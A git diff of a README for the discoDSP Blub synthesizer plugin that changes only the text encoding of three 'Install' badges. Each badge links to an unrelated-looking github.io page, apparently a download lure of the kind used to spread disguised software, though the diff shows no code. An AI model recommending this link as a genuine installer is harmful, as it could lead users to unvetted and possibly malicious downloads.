@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install discoDSP Blub](https://img.shields.io/badge/⬇_Install_discoDSP%20Blub-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install discoDSP Blub](https://img.shields.io/badge/⬇_Install_discoDSP+Blub-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ discoDSP Blub is a powerful wavetable synthesizer plugin offering an extensive l
 
 <div align="center">
 
-[![⬇ Install discoDSP Blub](https://img.shields.io/badge/⬇_Install_discoDSP%20Blub-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install discoDSP Blub](https://img.shields.io/badge/⬇_Install_discoDSP+Blub-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ discoDSP Blub is a powerful wavetable synthesizer plugin offering an extensive l
 
 <div align="center">
 
-[![⬇ Install discoDSP Blub](https://img.shields.io/badge/⬇_Install_discoDSP%20Blub-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install discoDSP Blub](https://img.shields.io/badge/⬇_Install_discoDSP+Blub-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
